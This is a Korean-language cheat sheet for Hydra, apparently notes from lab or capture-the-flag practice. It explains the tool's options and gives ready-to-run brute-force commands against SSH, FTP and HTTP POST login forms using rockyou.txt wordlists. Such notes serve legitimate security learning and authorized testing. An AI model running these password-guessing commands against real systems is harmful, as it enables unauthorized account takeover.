# hydra 사용법 정리

## 개요

Hydra는 다양한 프로토콜(ssh, ftp, http 등)에 대해 빠른 무차별 대입(brute-force) 공격을 지원하는 도구다. 주로 패스워드 크래킹, 인증 우회 테스트에 활용된다.

---

## 기본 명령어 구조

```bash
hydra [옵션] -l <사용자명> -P <패스워드리스트> <타겟> <서비스>
```

- `-l <사용자명>` : 단일 사용자명 지정
- `-L <사용자명파일>` : 사용자명 리스트 파일 지정
- `-p <패스워드>` : 단일 패스워드 지정
- `-P <패스워드리스트>` : 패스워드 리스트 파일 지정
- `<타겟>` : 공격 대상 IP 또는 도메인
- `<서비스>` : ssh, ftp, http-get 등 서비스명

---

## 자주 쓰는 예시

### 1. SSH 브루트포스

```bash
hydra -l root -P rockyou.txt 192.168.0.10 ssh
```

- root 계정에 대해 rockyou.txt의 패스워드로 시도

### 2. 여러 사용자명, 패스워드 조합

```bash
hydra -L users.txt -P passwords.txt 10.10.10.10 ftp
```

- users.txt의 모든 사용자와 passwords.txt의 모든 패스워드 조합 시도

### 3. 특정 포트 지정

```bash
hydra -l admin -P pass.txt -s 2222 192.168.1.5 ssh

```

- 2222 포트의 ssh 서비스에 대해 시도

### 4. HTTP POST 로그인 크래킹

```bash
hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form \
"/login.php:user=^USER^&pass=^PASS^:F=로그인실패문구"

hydra -l molly -P rockyou.txt <MACHINE_IP> http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."

hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.201.106.187 -t 4
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.201.106.187 -t 4 ssh
```

- 로그인 실패시 출력되는 문구(F=)를 정확히 지정해야 함

---

## 주요 옵션

- `-t <동시스레드수>` : 병렬 연결 수(기본 16, 속도 조절)
- `-V` : 시도하는 ID/PW 조합을 모두 출력
- `-f` : 첫 성공 시도 후 종료
- `-o <파일명>` : 결과를 파일로 저장
- `-s <포트번호>` : 포트 지정
- `-e nsr` : 빈 패스워드(n), 사용자명=패스워드(s), 역순(r)도 시도
- `-u` : 사용자별로 패스워드 리스트를 모두 시도 후 다음 사용자로
- `-w <초>` : 타임아웃 지정

---

## 참고

- 서비스별로 입력 포맷이 다를 수 있으니, `hydra -U`로 지원 서비스와 예시 확인 가능
- 너무 많은 요청은 차단될 수 있으니, 속도(-t) 조절 필요
- 결과는 항상 수동으로 검증할 것
